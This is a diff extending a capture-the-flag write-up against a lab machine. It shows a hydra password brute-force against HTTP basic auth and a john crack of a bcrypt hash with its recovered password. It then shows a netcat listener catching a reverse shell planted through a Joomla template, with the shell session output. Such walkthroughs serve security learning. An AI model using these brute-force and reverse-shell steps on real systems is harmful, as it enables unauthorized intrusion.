@@ -175,7 +175,7 @@ Below shows we just have to do basic authentication with hydra using http-get
 
 ![Screenshot_2022-03-28_10-32-22](https://user-images.githubusercontent.com/68706090/160454467-2abac213-0e4a-4655-989c-3aae601b86fc.png)
 
-#Hydra
+# Hydra
 
 ```console
 hydra -l joker -P /home/noob2uub/Documents/Wordlists/rockyou.txt -s 8080 -f 10.10.150.75 http-get
@@ -283,10 +283,54 @@ We have a hash that now we have to start cracking
 
 Hash = `$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG'
 
+now lets use john to get through it
 
+### John
 
+```console
+sudo john pass.txt /home/noob2uub/Documents/Wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+abcd1234         (?)     
+1g 0:00:00:04 DONE 2/3 (2022-03-28 11:26) 0.2475g/s 187.1p/s 187.1c/s 187.1C/s yellow..baby
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
 
+We now have the password and can log into the admin page of the site, lets look for a reverse shell. 
 
+I found this page, let see what I can do with it
 
+https://www.hackingarticles.in/joomla-reverse-shell/
+
+Start Netcat listener and then edit the template with the reverse shell provided by pentest monkey. 
+
+![Screenshot_2022-03-28_11-38-24](https://user-images.githubusercontent.com/68706090/160464457-0890f5cd-15dc-48a4-b2d4-6f51ff384127.png)
+
+# Netcat
+
+```console
+nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.13.27.142] from (UNKNOWN) [10.10.83.0] 46256
+Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 11:41:53 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 1: python: not found
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 2: python: not found
+$ whoami
+www-data
+$ 
+```
 
 
